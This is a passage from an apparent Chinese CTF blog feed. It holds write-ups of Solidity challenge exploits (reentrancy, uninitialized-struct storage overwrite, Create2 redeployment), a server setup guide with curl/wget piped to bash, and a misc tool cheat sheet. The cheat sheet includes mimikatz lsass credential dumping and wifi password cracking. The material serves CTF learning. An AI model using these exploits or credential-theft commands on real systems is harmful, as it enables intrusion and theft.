payable&#123;&#125; function hack1() &#123; target.profit(227609298); &#125; function hack2() &#123; target.withdraw(2); &#125; function() payable &#123; if (have_withdraw == 0 &amp;&amp; msg.sender == instance_address)&#123; have_withdraw = 1; target.withdraw(2); &#125; &#125; function hack3(string memory b64email) &#123; target.payforflag(b64email); &#125;&#125; 依次调用 hack1、hack2、hack3即可 需要注意的是，需要先强制转账给题目合约，不然重入攻击没法完成 完结，撒花🎉🎉🎉🎉🎉🎉🎉🎉🎉]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Balsn CTF 2019 - Bank]]></title>
    <url>%2F2020%2Fbalsn2019-bank%2F</url>
    <content type="text"><![CDATA[前言 复现 balsn2019 ctf 中的 bank 区块链题目 wtcl ,复现了一个下午 具体分析及官方 WP 如下: https://github.com/x9453/balsn-ctf-2019/tree/master/Bank 复现地址为: ropsten@0x85B0446Dc5B5f32cbB674Dc8e49Fc27Ebaff2Ee2 外部账户地址为: 0x785a8D0d84ad29c96f8e1F26BfDb3E6CB72cAe9b Source12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879pragma solidity ^0.4.24;contract Bank &#123; event SendEther(address addr); event SendFlag(address addr); address public owner; uint randomNumber = 0; constructor() public &#123; owner = msg.sender; &#125; struct SafeBox &#123; bool done; function(uint, bytes12) internal callback; bytes12 hash; uint value; &#125; SafeBox[] safeboxes; struct FailedAttempt &#123; uint idx; uint time; bytes12 triedPass; address origin; &#125; mapping(address =&gt; FailedAttempt[]) failedLogs; modifier onlyPass(uint idx, bytes12 pass) &#123; if (bytes12(sha3(pass)) != safeboxes[idx].hash) &#123; FailedAttempt info; info.idx = idx; info.time = now; info.triedPass = pass; info.origin = tx.origin; failedLogs[msg.sender].push(info); &#125; else &#123; _; &#125; &#125; function deposit(bytes12 hash) payable public returns(uint) &#123; SafeBox box; box.done = false; box.hash = hash; box.value = msg.value; if (msg.sender == owner) &#123; box.callback = sendFlag; &#125; else &#123; require(msg.value &gt;= 1 ether); box.value -= 0.01 ether; box.callback = sendEther; &#125; safeboxes.push(box); return safeboxes.length-1; &#125; function withdraw(uint idx, bytes12 pass) public payable &#123; SafeBox box = safeboxes[idx]; require(!box.done); box.callback(idx, pass); box.done = true; &#125; function sendEther(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123; msg.sender.transfer(safeboxes[idx].value); emit SendEther(msg.sender); &#125; function sendFlag(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123; require(msg.value &gt;= 100000000 ether); emit SendFlag(msg.sender); selfdestruct(owner); &#125;&#125; Analyse 合约创建后, slot 布局如下 123456789-----------------------------------------------------| unused (12) | owner (20) | &lt;- slot 0-----------------------------------------------------| randomNumber (32) | &lt;- slot 1-----------------------------------------------------| safeboxes.length (32) | &lt;- slot 2-----------------------------------------------------| occupied by failedLogs but unused (32) | &lt;- slot 3----------------------------------------------------- 关于 FailedAttempt 布局如下,在代码 33-36 行存在未初始化漏洞,会导致覆盖原先 slot0 到 slot2 的位置内容 1234567-----------------------------------------------------| idx (32) |-----------------------------------------------------| time (32) |-----------------------------------------------------| origin (20) | triedPass (12) |----------------------------------------------------- 同样, SafeBox 也是类似分析,会在 deposit() 中覆盖 slot0 和 slot1 12345-----------------------------------------------------| unused (11) | hash (12) | callback (8) | done (1) |-----------------------------------------------------| value (32) |----------------------------------------------------- 可以看到,如果通过 deposit 修改 slot0 和 slot1 是没用的,即使修改了 owner 也没用,因为还有第 74 行的限制 其实题目考查的是结构体未初始化漏洞+数组存储方式+mapping存储方式+控制程序执行流 因为 33-36 行中如果 origin 足够大,相当于修改了 safeboxes 数组的长度,让数组的长度足够大,如果大到可以修改或者覆盖 failedLogs,那么就可以通过 safeboxes 数组去访问 failedLogs,其实也相当于 failedLogs 是数组 safeboxes 的内容,所以这就对 tx.origin 有一定的要求 假设 safeboxes 可以包含 failedLogs,同时 FailedAttempt 中的 triedPass 可以覆盖 Safebox 的 callback : 因为 triedPass 我们可以完全控制,所以我们就可以通过 triedPass 控制 callback ,进一步控制程序执行流(第64行) 如果能够控制程序执行流的话,那么我们只需要找到第 75 行 emit SendFlag(msg.sender);的位置就行了,这个可以通过查看 bytecodes 对应的 opcode 找到,如下图,我们先找到 require(msg.value &gt;= 100000000 ether); 对应的位置,然后再找 emit SendFlag(msg.sender); 对应的位置,因为在EVM中调用一个函数相当于执行 jump 操作,而跳到的地方都是以 jumpdest 开始,所以 0x070f 就是我们想要跳到的位置,这样的话就可以触发 SendFlag 事件了 Solution 计算 target = keccak256(keccak256(msg.sender||3)) + 2 ,这里 target 就是 FailedAttempt[0] 中的 origin(20) | triedPass(12) 计算 base = keccak256(2) ,这里 base 就是 safeboxes 数组第一个元素在 slot 的位置 计算 idx = (target - base) // 2 , 这里 idx 指的是在 safeboxes 数组中的索引,因为一个 Safebox 占据两个 slot ,所以要除以 2 计算 (target - base) % 2 ,如果等于 0 ,说明 origin(20) | triedPass(12) 刚好可以覆盖 unused (11) | hash (12) | callback (8) | done (1) 计算 (msg.sender &lt;&lt; (12*8)) ,如果 &lt; idx ,说明 safeboxes 数组长度合适,可以包含 failedLogs ; 否则的话从步骤1重新开始 调用 deposit(0x000000000000000000000000) 并设置 msg.value = 1 ether : 这里是让 callback 指向 sendEther , 目的是下一步调用控制 safeboxes 数组长度 调用 withdraw(0, 0x111111111111110000070f00) : 这里相当于调用 sendEther(0, 0x111111111111110000070f00) ,将 failedLogs[msg.sender] 中的 triedPass 控制,相当于控制了 unused (11) | hash (12) | callback (8) | done (1) 所在 slot 的低 12 字节,修改了 callback ,其实相当于把 failedLogs[msg.sender] 对应的内容看成是 safeboxes 数组的内容,同时修改了数组长度 调用 withdraw(idx, 0x000000000000000000000000) : 这里就可以执行到 emit SendFlag(msg.sender); 撒花🎉🎉🎉🎉🎉🎉🎉🎉 题外知识12345678910111213141516contract C &#123; address a; uint r; uint[] b; mapping(uint =&gt; uint) m; constructor() public &#123; a = msg.sender; r = 777; b.push(333); b.push(444); m[999] = 888; &#125;&#125;// b第一个元素位置在keccak256(2),即slot(keccak256(2)+0)存储333,slot(keccak256(2)+1)存储444// m[k]存储在slot(keccak256(k||3)),即slot(keccak256(999||3))存储888 可通过下列函数分别获取 slot 内容、mapping 内容对应 slot 、数组第一个元素对应 slot 1234567891011function read_slot(uint k) public view returns (bytes32 res) &#123; assembly &#123; res := sload(k) &#125;&#125;function cal_addr(uint k, uint p) public pure returns(bytes32 res) &#123; res = keccak256(abi.encodePacked(k, p));&#125;function cal_addr(uint p) public pure returns(bytes32 res) &#123; res = keccak256(abi.encodePacked(p));&#125;]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>balsn2019</tag>
        <tag>bank</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[djJyYXk=(b64)伪装 + 宝塔 + typecho]]></title>
    <url>%2F2020%2FTypecho-V2ray%2F</url>
    <content type="text"><![CDATA[前言 换个动态博客 typecho 为了省钱,在同一个 vps 上搭建了 djJyYXk= 和 typecho 由于之前摸索搭建的方法,中间走了很多曲折路,由于申请太多 ssl 证书,导致域名暂时被 Let&#39;s Encrypt 拉入黑名单,所以目前没法更换到 typecho ,先记录一下方法吧 为了省事,直接用了宝塔,先安装宝塔 1yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.sh 然后用宝塔安装 typecho ,这里不要申请 ssl 证书 再安装 djJyYXk= 伪装 1bash &lt;(curl -sL https://raw.githubusercontent.com/hijkpw/scripts/master/centos_install_v2ray2.sh) 最后修改 nginx , 路径为 /www/server/panel/vhost/nginx/blog.hitcxy.com.conf, 把 blog.hitcxy.com 换成相对应的主机名即可, ssl 证书用 v2ray 申请的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768server &#123; listen 80; server_name blog.hitcxy.com; return 301 https://$server_name:443$request_uri;&#125;server &#123; listen 443 ssl http2; server_name blog.hitcxy.com; charset utf-8; # ssl配置 ssl_protocols TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_ecdh_curve secp384r1; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_session_timeout 10m; ssl_session_tickets off; ssl_certificate /etc/letsencrypt/live/blog.hitcxy.com/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/blog.hitcxy.com/privkey.pem; #PHP-INFO-START PHP引用配置，可以注释或修改 include enable-php-70.conf; #REWRITE-START URL重写规则引用,修改后将导致面板设置的伪静态规则失效 include /www/server/panel/vhost/rewrite/blog.hitcxy.com.conf; root /www/wwwroot/blog.hitcxy.com; location / &#123; index index.php index.html index.htm default.php default.htm default.html; # proxy_pass http://www.ddxsku.com/; &#125; #禁止访问的文件或目录 location ~ ^/(\.user.ini|\.htaccess|\.git|\.svn|\.project|LICENSE|README.md) &#123; return 404; &#125; location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ &#123; expires 30d; error_log off; access_log /dev/null; &#125; location ~ .*\.(js|css)?$ &#123; expires 12h; error_log off; access_log /dev/null; &#125; access_log /www/wwwlogs/blog.hitcxy.com.log; error_log /www/wwwlogs/blog.hitcxy.com.error.log; location /pikachu_ufo &#123; proxy_redirect off; proxy_pass http://127.0.0.1:29001; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; proxy_set_header Host $host; # Show real IP in v2ray access.log proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;&#125;]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>djJyYXk=</tag>
        <tag>宝塔</tag>
        <tag>typecho</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Balsn CTF 2019 - Creativity]]></title>
    <url>%2F2020%2Fbalsn2019-create2%2F</url>
    <content type="text"><![CDATA[前言 复现 balsn2019 ctf 中的 Creativity 区块链题目 这道题其实早就想复现了,只不过一直没有复现成功,是有关 create2 的骚操作,基本操作可参考另外一片文章https://hitcxy.com/2020/Create2/ 具体分析及官方 WP 如下: https://github.com/x9453/balsn-ctf-2019/tree/master/Creativity 原谅我菜的抠脚…都 2020 了,还在做 2019 的题目 复现地址为: ropsten@0x3975c105e8D582A324F6093E7471fDf9d5b9Fa67 Source1234567891011121314151617181920212223242526pragma solidity ^0.5.10;contract Creativity &#123; event SendFlag(address addr); address public target; uint randomNumber = 0; function check(address _addr) public &#123; uint size; assembly &#123; size := extcodesize(_addr) &#125; require(size &gt; 0 &amp;&amp; size &lt;= 4); target = _addr; &#125; function execute() public &#123; require(target != address(0)); target.delegatecall(abi.encodeWithSignature("")); selfdestruct(address(0)); &#125; function sendFlag() public payable &#123; require(msg.value &gt;= 100000000 ether); emit SendFlag(msg.sender); &#125;&#125; Analyse 题目大概逻辑是: 让我们部署一个合约,合约代码大小不超过4字节 调用 check ,参数是我们部署的合约地址 调用 execute ,执行 delegatecall 到我们部署的合约内 但是,有个问题,我们没法在4个字节内 emit SendFlag 其实题目考查知识点为 Create2 的骚操作: 在同一个地址上部署合约,合约的字节码可以不同,即在同一个地址上先后可部署不同的合约 通过调用下面 Deployer.deploy 函数,我们可以把不同合约先后部署在同一个地址上, deployedAddr 即为部署的合约地址 123456789101112131415161718192021222324252627pragma solidity ^0.5.10;contract Deployer &#123; bytes public deployBytecode; address public deployedAddr; function deploy(bytes memory code) public &#123; deployBytecode = code; address a; // Compile Dumper to get this bytecode bytes memory dumperBytecode = hex'6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe'; assembly &#123; a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x8866) &#125; deployedAddr = a; &#125;&#125;contract Dumper &#123; constructor() public &#123; Deployer dp = Deployer(msg.sender); bytes memory bytecode = dp.deployBytecode(); assembly &#123; return (add(bytecode, 0x20), mload(bytecode)) &#125; &#125;&#125; 所以题目的逻辑如下: 用 create2 的骚操作,部署一个合约 0x33ff ,即 selfdestruct(msg.sender) 调用 check() ,让 target 为我们部署的合约地址 给我们部署的合约发一笔空交易,让它自毁 再次使用 create2 骚操作,在同一个地址部署合约,合约内容为 emit SendFlag(0) 调用 execute() ,就会执行我们第二次部署的合约的 emit SendFlag 事件,因为是 delegatecall 操作,所以还是相当于在原题目合约中进行的 emit SendFlag 操作,成功! Solution 先将 Deployer 部署,地址为 0x307FdF03B1842A501F52221e4cF02D67BfeEc399 , 然后使用 Deployer.deploy 部署 0x33ff ,得到部署的合约地址 0x2b473f517088f6d08e82cA06dD5A5e6A68Eb4663 调用 check() , target 已经变成了我们部署的合约地址 给我们部署的合约发一笔空交易,让它自毁,目的是为了重新在这个地址部署合约触发 SendFlag 事件,可以看到部署的合约已经自毁 1web3.eth.sendTransaction(&#123; from: &apos;0x785a8D0d84ad29c96f8e1F26BfDb3E6CB72cAe9b&apos;, to: &quot;0x2b473f517088f6d08e82cA06dD5A5e6A68Eb4663&quot;, data: &quot;&quot; &#125;, function(err,res)&#123;console.log(res)&#125;); 使用 create2 骚操作,在同一个地址部署合约,合约内容为 emit SendFlag(0) ,这里我是写了一个 hack 合约,然后使用 Deployer.deploy 部署 123456contract hack &#123; event SendFlag(address addr); constructor() public &#123; emit SendFlag(address(0)); &#125;&#125; 这样就把内容为 emit SendFlag 的 hack 合约给部署到同一个地址 0x2b473f517088f6d08e82cA06dD5A5e6A68Eb4663 上了,如下图 调用 execute() ,就会执行我们第二次部署的合约的 emit SendFlag 事件 完结!!!🎉🎉🎉🎉🎉🎉]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>balsn2019</tag>
        <tag>create2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[misc_tools]]></title>
    <url>%2F2020%2Fmisc-tools%2F</url>
    <content type="text"><![CDATA[前言 本文包含在 windows 和在 kali 下使用的工具 转载自 Ga1@xy misc工具 图片相关jpgf5-steganography （F5隐写+需要passwd） 安装 1git clone https://github.com/matthewgao/F5-steganography 使用: 进入 F5-steganography 文件夹 12java Extract 1.jpg -p 123456// -p后接f5的key outguess (图片隐写) 安装 123git clone https://github.com/crorvick/outguesscd outguess./configure &amp;&amp; make &amp;&amp; make install 加密 1234outguess -k 12345 -d hidden.txt 1.jpg 2.jpg// -k后接密码// -d后接要隐藏的内容// 加密后1.jpg会覆盖2.jpg 解密 1234outguess -k 12345 -r 2.jpg out.txt// out.txt 中内容即为想要隐藏的 hidden.txt 中内容// 也可不需要密码outguess -r 2.jpg out.txt stegdetect（检查jpg图片隐写方法_win）12345678stegdetect.exe -tjopi -s 10.0 [stego_file]-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：j 检测图像中的信息是否是用jsteg嵌入的。o 检测图像中的信息是否是用outguess嵌入的。p 检测图像中的信息是否是用jphide嵌入的。i 检测图像中的信息是否是用invisible secrets嵌入的。 如果显示为 [stego_file]：jphide(***)，则可以用 stegbreak 破解密码 1stegbreak -r rules.ini -f password.txt -t p [stego_file] jphide 可使用工具 JPHS steghide (图片或音频隐藏文件) 安装 1apt-get install steghide 加密 1steghide embed -cf out.jpg -ef flag.txt [-p 123456] # -p后接密码，可无 解密 123456// 查看图片中嵌入的文件信息:steghide info out.jpg// 提取含有密码的隐藏内容:steghide extract -sf out.jpg -p 123456// 提取不含有密码的隐藏内容:steghide extract -sf out.jpg steghide 爆破密码 有些题目用steghide加密文件但是不给密码，此时就需要爆破，steghide 本身并不支持爆破，需要一些其他的方法：https://github.com/Va5c0/Steghide-Brute-Force-Tool 123python steg_brute.py -b -d [字典] -f [jpg_file]// 需要安装的库: progressbarpip install progressbar2 png &amp; bmpBlindWaterMark （盲水印）第一种 正常的bwm 安装 在github上下载脚本 bwm.py （网址： https://github.com/chishaxie/BlindWaterMark ） 123// 安装python前置模块pip install -i https://pypi.tuna.tsinghua.edu.cn/simple opencv-pythonsudo pip install matplotlib 加密 1234python bwm.py encode 1.png water.png 2.png// 1.png 为无水印原图// water.png 为水印图// 2.png 为有盲水印图 解密 1234python bwm.py decode 1.png 2.png flag.png// 1.png 为无水印原图// 2.png 为有盲水印的图// flag.png 为解出来的图片 第二种 频域盲水印1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import cv2import numpy as npimport randomimport osfrom argparse import ArgumentParserALPHA = 5def build_parser(): parser = ArgumentParser() parser.add_argument(&apos;--original&apos;, dest=&apos;ori&apos;, required=True) parser.add_argument(&apos;--image&apos;, dest=&apos;img&apos;, required=True) parser.add_argument(&apos;--result&apos;, dest=&apos;res&apos;, required=True) parser.add_argument(&apos;--alpha&apos;, dest=&apos;alpha&apos;, default=ALPHA) return parserdef main(): parser = build_parser() options = parser.parse_args() ori = options.ori img = options.img res = options.res alpha = options.alpha if not os.path.isfile(ori): parser.error(&quot;original image %s does not exist.&quot; % ori) if not os.path.isfile(img): parser.error(&quot;image %s does not exist.&quot; % img) decode(ori, img, res, alpha)def decode(ori_path, img_path, res_path, alpha): ori = cv2.imread(ori_path) img = cv2.imread(img_path) ori_f = np.fft.fft2(ori) img_f = np.fft.fft2(img) height, width = ori.shape[0], ori.shape[1] watermark = (ori_f - img_f) / alpha watermark = np.real(watermark) res = np.zeros(watermark.shape) random.seed(height + width) x = range(height / 2) y = range(width) random.shuffle(x) random.shuffle(y) for i in range(height / 2): for j in range(width): res[x[i]][y[j]] = watermark[i][j] cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), 100])if __name__ == &apos;__main__&apos;: main()// python pinyubwm.py --original 1.png --image 2.png --result out.png// 查看 out.png 即可，如果无法得到正常图片，可将 1.png 和 2.png 调换位置再次尝试 lsb的py脚本解密（lsb隐写+需要passwd） 下载： https://github.com/livz/cloacked-pixel 简单使用如下,其余详见: https://github.com/livz/cloacked-pixel 1python lsb.py extract [stego_file] [out_file] [password] zsteg (lsb隐写)123gem install zstegzsteg 1.bmp// 一般来讲用 zsteg 解密的文件都为 bmp 文件 pngcheck（检查IDAT块_win）1pngcheck.exe -v 123.png 可检查 png 的 IDAT 块是否有问题 相关题目可参考：https://blog.csdn.net/u010391191/article/details/80818785 有关解题脚本可参考 FzWjScJ 师傅的 blog ：http://www.fzwjscj.xyz/index.php/archives/17/ WebP 安装 (kali) 1apt install webp cwebp - 编码器工具：可将 png 转为 webp 1cwebp 1.png -o 2.webp dwebp - 解码器工具：可将 webp 转为 png 1dwebp 1.webp -o 2.png vwebp - 查看器工具：可直接查看 webp 格式图片 1vwebp 1.webp webpinfo - 格式查看工具：可打印出 WebP 文件的块级结构以及基本完整性检查 1webpinfo 1.webp 其余（ gif2webp、img2webp 等可见 官方文档 ） exiftool（查看图片exif信息） 安装 (kali) 1apt-get install exiftool 使用 1234exiftool 1.jpg // 显示图片所有信息exiftool 1.jpg | grep flag // 查看图片有关‘flag’字符的信息exiftool * // 查看此文件夹所有图片信息exiftool -b -ThumbnailImage attachment.jpg &gt;flag.jpg stegpy（支持多种文件加密） 此种加密支持对PNG、BMP、GIF、WebP和WAV格式加密，同时可以选择有无password 安装 (kali) 1pip3 install stegpy 加密 不含有密码 1stegpy &apos;hello_world&apos; image.png - 含有密码 123stegpy &quot;hello_world&quot; image.png -pEnter password (will not be echoed): // 输入密码（不显示）Verify password (will not be echoed): // 确认密码（不显示） 解密 不含有密码 1stegpy _image.png - 含有密码 12stegpy _image.png -pEnter password (will not be echoed): // 输入密码（不显示） 压缩包相关crc值爆破 (zip包碰撞crc值) 下载脚本：https://github.com/theonlypwner/crc32 1python crc32.py reverse 你的crc32密文 压缩包密码爆破 Fcrackzip ARCHPR 可参考 https://ctf-wiki.github.io/ctf-wiki/misc/archive/zip-zh/#_3 ZipCenOp（zip伪加密） 加密 1java -jar ZipCenOp.jar e xxx.zip 解密 1java -jar ZipCenOp.jar r xxx.zip pyc文件相关uncompyle6（pyc文件反编译）12pip install uncompyle6uncompyle6 test.pyc &gt; test.py Stegosaurus（pyc隐写_win）12// 版本：Python 3.6 or laterpython stegosaurus.py -x [pyc_file] 音频相关MP3stego（MP3隐写_win）1...\Decode.exe -X -P [password] [stego_mp3] steghide（图片或音频隐藏文件） 安装（kali中） 1apt-get install steghide 加密 12steghide embed -cf out.jpg -ef flag.txt [-p 123456]// -p后接密码，可无 解密 123456// 查看图片中嵌入的文件信息：steghide info out.jpg// 提取含有密码的隐藏内容：steghide extract -sf out.jpg -p 123456// 提取不含有密码的隐藏内容：steghide extract -sf out.jpg steghide爆破密码 有些题目用steghide加密文件但是不给密码，此时就需要爆破，steghide本身并不支持爆破，需要一些其他的方法：https://github.com/Va5c0/Steghide-Brute-Force-Tool 123python steg_brute.py -b -d [字典] -f [jpg_file]// 需要安装的库：progressbarpip install progressbar2 其它aircrack-ng（爆破wifi密码） kali下自带有一份无线密码字典：/usr/share/wordlists/rockyou.txt.gz，我们需要将其解压 12345cd /usr/share/wordlists/rockyou.txt.gzgzip -d rockyou.txt.gzaircrack-ng -w /usr/share/wordlists/rockyou.txt -b [MAC] [capfile]// -w 后加字典的位置（kali中自带字典的位置）// -b 后加路由器的MAC地址（应该也就是 BSSID） xortool（猜测xor加密的密码长度及值） 这里只列出了最简单的使用方法，其余可见：https://pypi.org/project/xortool/ 123xortool (-x) -c 20 123.txt// -x：代表文件内容为十六进制// -c：后加出现频率最高的字符，文本内容一般是空格（20），二进制文件一般是00 mimikatz（抓取lsass密码） 参考: 介绍一下神器mimikatz，从lsass里抓密码 | Jarett’s Blog 下载：https://pan.baidu.com/s/1qZmnPar-gfqT9OaWO_DS3g 提取码 svp9 将 lsass.dmp 文件放在 mimikatz.exe 所在目录下，关闭杀软后打开 mimikatz.exe , 执行以下三条命令： 123privilege::debugsekurlsa::minidump lsass.dmpsekurlsa::logonpasswords full gaps (拼图) 安装 12345git clone https://github.com/nemanja-m/gaps.gitcd gaps pip install -r requirements.txtsudo apt-get install python-tkpip install -e . 创建拼图 得到的拼图所有图在一张大图上，可以配合 convert 命令将其切开 1create_puzzle [图片绝度路径] --size=[尺寸] --destination=[创建拼图名称] 还原拼图 如果还原的是被切开成一小块一小块的拼图，需要先将其拼在一张大图上（可用 montage 命令），之后再用 gaps 将其还原： 12345678gaps --image=out.jpg --generations=50 --population=120 --size=50--image 指向拼图的路径--size 拼图块的像素尺寸--generations 遗传算法的代的数量--population 个体数量--verbose 每一代训练结束后展示最佳结果--save 将拼图还原为图像 dtmf2num（电话音解码） windows 下有 也有 python 脚本: https://github.com/hfeeki/dtmf]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>tools</tag>
        <tag>kali</tag>
        <tag>win</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GKCTF2020 Harley Quinn]]></title>
    <url>%2F2020%2FHarley-Quinn%2F</url>
    <content type="text"><![CDATA[前言 打了一天的 GKCTF2020 ,上面的图后面几道是后来根据 官方WP 复现的, 提取码: du34 竟然把 crypto 给 AK 了,出题人题目出简单了,不然我一道也做不出来,害,其它题目也做不动 misc 也做出来一道,仅以此记录一下 附件 https://pan.baidu.com/s/14bITFhiiPysPMFZTqzYKYA 密码: tn6x Solutions 解压压缩包得到 .wav 和 .jpeg 文件 用 Audacity 分析 wav 文件,在频谱末尾找到下面一段 DTMF 拨号,用 dtmf2num.exe 工具识别加上人工比对修改,最后得到 #222833344477773338866# 这串东西, 查阅资料 ctf-wiki ,手机键盘密码,比如 222 对应的就是 23 ,是 c 字母,依次类推,最后得到 #ctfisfun# 然后卡住了,过了好久,题目放出 hint : FreeFileCamouflage ,然后回过头去查看压缩包注释,也有这样一段话,虽然开头是乱码 查阅资料,发现 FreeFileCamouflage 是一款将重要文档以 AES 加密算法存放到 JPG 格式的图片中,于是开始下载使用如下, passwd 就是之前得到的 ctfisfun 得到一个 flag.txt 文件: flag{Pudd1n!!_y0u_F1nd_m3!}]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>GKCTF2020</tag>
        <tag>Harley Quinn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Create2]]></title>
    <url>%2F2020%2FCreate2%2F</url>
    <content type="text"><![CDATA[前言 智能合约生成合约地址的第二种方式 Create2 以一道例题解释 计算地址有两种方式 Create : keccak256(rlp.encode(deployingAddress, nonce))[12:] Create2 : keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:] 关于 Create2 ,这里就不介绍了,可以参考 EIP 1014: CREATE2 指令 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;interface IName &#123; function name() external view returns (bytes32);&#125;contract FuzzyIdentityChallenge &#123; bool public isComplete; function authenticate() public &#123; require(isSmarx(msg.sender)); require(isBadCode(msg.sender)); isComplete = true; &#125; function isSmarx(address addr) internal view returns (bool) &#123; return IName(addr).name() == bytes32("smarx"); &#125; function isBadCode(address _addr) internal pure returns (bool) &#123; bytes20 addr = bytes20(_addr); bytes20 id = hex"000000000000000000000000000000000badc0de"; bytes20 mask = hex"000000000000000000000000000000000fffffff"; for (uint256 i = 0; i &lt; 34; i++) &#123; if (addr &amp; mask == id) &#123; return true; &#125; mask &lt;&lt;= 4; id &lt;&lt;= 4; &#125; return false; &#125;&#125; 很简单,要求 name 是 smarx ,并且 msg.sender 包含 badc0de ,可通过下面合约解决,只需要合约地址包括 badc0de 即可 123456789pragma solidity ^0.5.12;contract BadCodeSmarx is IName &#123; function callAuthenticate(address _challenge) public &#123; FuzzyIdentityChallenge(_challenge).authenticate(); &#125; function name() external view returns (bytes32) &#123; return bytes32("smarx"); &#125;&#125; 用 Create2 方法解决,如下,我们只需要计算出相对应的 salt 即可, Deployer 被部署在 0xca4dfd86a86c48c5d9c228bedbeb7f218a29c94b 12345678910111213contract Deployer &#123; // contractBytecode是待部署合约的bytecode bytes contractBytecode = hex"608060405234801561001057600080fd5b5061015d806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806306fdde031461003b5780637872ab4914610059575b600080fd5b61004361009d565b6040518082815260200191505060405180910390f35b61009b6004803603602081101561006f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100c5565b005b60007f736d617278000000000000000000000000000000000000000000000000000000905090565b8073ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561010d57600080fd5b505af1158015610121573d6000803e3d6000fd5b505050505056fea265627a7a72315820fb2fc7a07f0eebf799c680bb1526641d2d905c19393adf340a04e48c9b527de964736f6c634300050c0032"; function deploy(bytes32 salt) public &#123; bytes memory bytecode = contractBytecode; address addr; assembly &#123; addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt) &#125; &#125;&#125; 写了一个脚本爆破 salt, 只要包含 badc0de 即可 1234567891011121314151617from web3 import Web3s1 = '0xffca4dfd86a86c48c5d9c228bedbeb7f218a29c94b's3 = '4670da3f633e838c2746ca61c370ba3dbd257b86b28b78449f4185480e2aba51'i = 0while(1): salt = hex(i)[2:].rjust(64, '0') s = s1+salt+s3 hashed = Web3.sha3(hexstr=s) hashed_str = ''.join(['%02x' % b for b in hashed]) if 'badc0de' in hashed_str[24:]: print(salt,hashed_str) break i += 1 print(salt) 结果如下 最后调用 Deployer.deploy(0x00...005b2bfe) 即可把 BadCodeSmarx 合约部署到地址 0xa905a3922a4ebfbc7d257cecdb1df04a3badc0de 上 也有大佬通过 Create 方式解决的,有兴趣的可以参考 https://www.anquanke.com/post/id/154104#h3-11 , 带佬自行验证,我没有验证]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Create2</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蜜罐合约]]></title>
    <url>%2F2020%2FHoneypot-Contract%2F</url>
